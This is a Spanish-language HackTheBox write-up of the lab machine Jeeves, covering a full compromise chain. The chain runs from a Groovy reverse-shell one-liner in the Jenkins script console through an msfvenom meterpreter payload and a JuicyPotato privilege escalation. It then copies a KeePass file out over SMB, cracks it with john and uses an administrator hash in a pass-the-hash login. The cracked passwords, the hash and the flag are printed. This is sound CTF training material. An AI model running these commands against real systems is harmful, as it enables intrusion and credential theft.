---
tags:
title: Jeeves - Medium (HTB)
permalink: /Jeeves-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p80,135,445,50000 10.10.10.63                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 13:40 -03
Nmap scan report for 10.10.10.63
Host is up (0.43s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m56s, deviation: 0s, median: 4h59m55s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-16T21:40:13
|_  start_date: 2025-10-16T21:38:44

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.96 seconds
```

# Service enumeration

### HTTP - Port 80

Se nos presenta una pagina web donde tenemos unicamente funcional las seccion de busqueda.

![{54D7345F-A51D-46EA-93AE-DED81CA797DB}](images/{54D7345F-A51D-46EA-93AE-DED81CA797DB}.png)

Vemos que al poner algo como prueba para ver su comportamiento nos redirigue a `/error.html`. El cual parece ser una imagen y no la simple respuesta de la maquina como error.

![{D3693817-1D98-44ED-98E8-92A2B4EA6B40}](images/{D3693817-1D98-44ED-98E8-92A2B4EA6B40}.png)

### RPC - Port 135

```bash
rpcclient -U "" -N 10.10.10.63
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

Vemos que intentando enumerar rpc no tenemos exito. Asi que pasemos a ver si podemos enumerar shares, ya que el puerto `445` esta abierto.

### SMB - Port 445

```bash
smbmap -u '' -H 10.10.10.63

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (10.10.10.63) Error occurs while reading from remote(104) on line 1015                       
[*] Closed 1 connections
```

Vemos que con null session no nos lo permite.

### HTTP - Port 50000

Vemos que en el puerto `50000` corre `jenkins`,

>`Jenkins` es un servidor de automatización de código abierto. Ayuda a automatizar las partes del desarrollo de software relacionadas con la construcción, prueba e implementación, facilitando la integración continua y la entrega continua.


Esta web corre con una versión que es vulnerable a `Http Request Smuggling`, pero primero enumeremos a web.

![{64A5E1E0-70EB-40D7-8941-F44EF7EC585D}](images/{64A5E1E0-70EB-40D7-8941-F44EF7EC585D}.png)

Vemos que debajo nos indica que es la version `Jenkins 2.87`, asi que en mi caso voy a buscar en `searchsploit`.

```bash
searchsploit jenkins 2.87             
Exploits: No Results
Shellcodes: No Results
                                                                                                                                                                                           
Shellcodes: No Result
```

Vemos que no no sale nada para esa version pero buscando por vulnerabilidades de `jenkins` en general. Vemos varias

```bash
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/jeeves]
└─# searchsploit jenkins                  
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudBees Jenkins 2.32.1 - Java Deserialization                                                                                                          | java/dos/41965.txt
Jenkins - Script-Console Java Execution (Metasploit)                                                                                                     | multiple/remote/24272.rb
Jenkins - XStream Groovy classpath Deserialization (Metasploit)                                                                                          | multiple/remote/43375.rb
Jenkins 1.523 - Persistent HTML Code                                                                                                                     | php/webapps/30408.txt
Jenkins 1.578 - Multiple Vulnerabilities                                                                                                                 | multiple/webapps/34587.txt
Jenkins 1.626 - Cross-Site Request Forgery / Code Execution                                                                                              | java/webapps/37999.txt
Jenkins 1.633 - Credential Recovery                                                                                                                      | java/webapps/38664.py
Jenkins 2.137 and Pipeline Groovy Plugin 2.61 - ACL Bypass and Metaprogramming Remote Code Execution (Metasploit)                                        | java/remote/46572.rb
Jenkins 2.150.2 - Remote Command Execution (Metasploit)                                                                                                  | linux/webapps/46352.rb
Jenkins 2.235.3 - 'Description' Stored XSS                                                                                                               | java/webapps/49237.txt
Jenkins 2.235.3 - 'tooltip' Stored Cross-Site Scripting                                                                                                  | java/webapps/49232.txt
Jenkins 2.235.3 - 'X-Forwarded-For' Stored XSS                                                                                                           | java/webapps/49244.txt
Jenkins 2.441 - Local File Inclusion                                                                                                                     | java/webapps/51993.py
Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in                                                                                                | java/webapps/48904.txt
Jenkins < 1.650 - Java Deserialization                                                                                                                   | java/remote/42394.py
Jenkins build-metrics plugin 1.3 - 'label' Cross-Site Scripting                                                                                          | java/webapps/47598.py
Jenkins CI Script Console - Command Execution (Metasploit)                                                                                               | multiple/remote/24206.rb
Jenkins CLI - HTTP Java Deserialization (Metasploit)                                                                                                     | linux/remote/44642.rb
Jenkins CLI - RMI Java Deserialization (Metasploit)                                                                                                      | java/remote/38983.rb
Jenkins Dependency Graph View Plugin 0.13 - Persistent Cross-Site Scripting                                                                              | java/webapps/47111.txt
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting                                                                                        | java/webapps/47927.txt
Jenkins Mailer Plugin < 1.20 - Cross-Site Request Forgery (Send Email)                                                                                   | linux/webapps/44843.py
Jenkins Plugin Script Security 1.49/Declarative 1.3.4/Groovy 2.60 - Remote Code Execution                                                                | java/webapps/46453.py
Jenkins Plugin Script Security < 1.50/Declarative < 1.3.4.1/Groovy < 2.61.1 - Remote Code Execution (PoC)                                                | java/webapps/46427.txt
Jenkins Software RakNet 3.72 - Remote Integer Underflow                                                                                                  | multiple/remote/33802.txt
SonarQube Jenkins Plugin - Plain Text Password                                                                                                           | php/webapps/30409.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Shell as kohsuke

Vemos dos PoCs que se acercan a nuestra version. Uno se trata de un `Sandbox Escape` y el otro de un `RCE (Remote Code Execution)` abusando de `groovy`, buscando en internet por `jenkins groovy script vulnerability`, nos cruzamos con este [enlace](https://medium.com/@dextor928/enabled-sign-up-on-jenkins-leading-to-groovy-script-remote-code-execution-vulnerability-6d345f5dba0d)

> Donde basicamente explica un poco de como funciona la vulnerabilidad, y donde explica un poco de la consola de `scripts` de `groovy`, donde nos da entender que `groovy` es un lenguaje bastante poderoso, y con una sintaxis parecida a la de `Java`, permitiendo asi crear subprocesos y la ejecucion de comandos en el plugin de `Jenkins` y sus agentes.

Si nos vamos a la opcion de `Administrar Jenkins`, nos aparece la opcion de la consola de `scripts`, asi que ejecutemos un `whoami` como se detalla en el enlace.

Comando a ejecutar:

```groovy
"whoami".execute().text
```

![{B7586D3F-7A86-4372-9E13-7E6D3461400F}](images/{B7586D3F-7A86-4372-9E13-7E6D3461400F}.png)

Vemos que efectivamente estamos ejecutando comandos remotamente, asi que pasemos a entablarnos una `Reverse shell`, pero solicitando una `cmd.exe` ya que la pagina es hosteada por una maquina Windows.

Comando a ejecutar.

```groovy
String host=”YOUR-IP”;
int port=YOUR-IP-PORT;
String cmd=”bash”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![{181D0620-2E1B-412B-BDED-6ADA865E61A3}](images/{181D0620-2E1B-412B-BDED-6ADA865E61A3}.png)

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.63] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami
whoami
jeeves\kohsuke
```

## Shell as nt system

### Enumeration

Viendo los privilegios que tenemos como el usuario `kohsuke` vemos que tenemos el conocido `SeImpersonatePrivilege`, del cual podemos usar herramientas como `PrintSpoofer.exe`, `RottenPotato`, o `JuicyPotato.exe`, en mi caso me funciono la ultima.

```powershell
C:\Users\Administrator\.jenkins\secrets>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

Para tener una shell mas estable ya que no me permitia establecer una `PowerShell` cree mi payload con `msfvenom`.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f exe -o payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
                                                                                                                                                                                           
┌──(root㉿zsln)-[/home/…/Desktop/zsln/htb/jeeves]
└─# msfconsole                                                                                       
Metasploit tip: You can pivot connections over sessions started with the 
ssh_login modules
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v6.4.92-dev                                ]
+ -- --=[ 2,563 exploits - 1,315 auxiliary - 1,683 payloads     ]
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use multi/hanlder
[-] No results from search
[-] Failed to load module: multi/hanlder
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.16.6
lhost => 10.10.16.6
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > 


msf exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.6       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.6:4444 
[*] Sending stage (230982 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.16.6:4444 -> 10.10.10.63:49681) at 2025-10-16 14:46:51 -0300

```

Y ahora desde la misma consola de `metaslploit`, subo por las dudas en `nc.exe` en caso de que lo necesite. Y ademas subo el `JuicyPotato.exe` para establecer la shell como `nt authority\system`.
Asi que nuevamente me vuelvo a configurar mi `metasploit`. Y desde otra consola ejecuto el `.exe` para recibir mi shell.

```powershell
PS C:\ProgramData> .\JuicyPotato.exe -t * -p payload.exe -l 4444
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

Y vemos que con exito recibo mi shell como la maxima autoridad.

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 10.10.16.6 
lhost => 10.10.16.6
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.6:4444 
[*] Sending stage (230982 bytes) to 10.10.10.63
[*] Meterpreter session 1 opened (10.10.16.6:4444 -> 10.10.10.63:49690) at 2025-10-16 15:03:48 -0300

meterpreter > shell
Process 1760 created.
Channel 1 created.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Una vez dentro como `system`, si intentamos visualizar la flag, vemos que no esta en el directorio de `administrator`, pero hay un archivo `.txt` con un mensaje.

## Pass-The-Hash as administrator
```powershell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,627,190,784 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

## Founding root.txt

Sin embargo en el directorio `documents` de `kohsuke` vemos un archivo del gestor de base de datos de `keepass`.

```bash
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   2,627,186,688 bytes free
```

Nos lo compartimos a nuestra maquina, inicializando un recurso compartido con `smbserver` de impacket.

```bash
impacket-smbserver smbFolder $(pwd) -smb2support  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Y desde la consola movemos el archivo hacia nuestro recurso.

```powershell
C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.16.6\smbFolder
copy CEH.kdbx \\10.10.16.6\smbFolder
        1 file(s) copied.
```

Y ahora desde nuestra consola lo abrimos con `keepassxc`.

```bash
keepassxc CEH.kdbx
```

Pero vemos que esta protegido con una `masterkey`.

![{90808CC6-B6B8-4C87-BDB7-D90909FAD737}](images/{90808CC6-B6B8-4C87-BDB7-D90909FAD737}.png)

Asi que con `keepass2john` convertimos el archivo a un hash el cual podamos romper coon `john`.

```bash
john hash_keepass --wordlist=/usr/share/wordlists/rockyou.txt                                                
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:00:21 DONE (2025-10-16 15:24) 0.04686g/s 2576p/s 2576c/s 2576C/s nando1..molly21
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Una vez tenemos la masterkey de la base de datos entramos.

![{74E322AB-01FE-4E81-A782-E74BF794D462}](images/{74E322AB-01FE-4E81-A782-E74BF794D462}.png)

Vemos varias claves almacenadas de varios usuarios, entre ellos, `administrator`, estas con algunas de las passwords almacenadas:

```bash
cat pass         
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
```

Pero hay una clave guardada para un usuario sin nombre, solo muestra un `?`.

![{9008128A-7956-4590-B1AA-8DB646C073DA}](images/{9008128A-7956-4590-B1AA-8DB646C073DA}.png)

Vemos que parece ser un `hash`, vamos a ver de quien es con la herramienta `crackmapexec`.

```bash
crackmapexec smb 10.10.10.63 -u users --hash e0fb1fb85756c24235ff238cbe81fe00
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

Como vemos que pertenece al usuario `administrator` y sabiendo que no podemos acceder via `WinRM` nos conectamos con `psexec` de impacket haciendo `Pass-The-Hash`.

```bash
impacket-psexec jeeves/administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 -dc-ip 10.10.10.63
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file ocJTfXgH.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service nlaI on 10.10.10.63.....
[*] Starting service nlaI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Bueno.. Estaba encondida.

```powershell
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,626,945,024 bytes free

C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

`~Happy Hacking.`



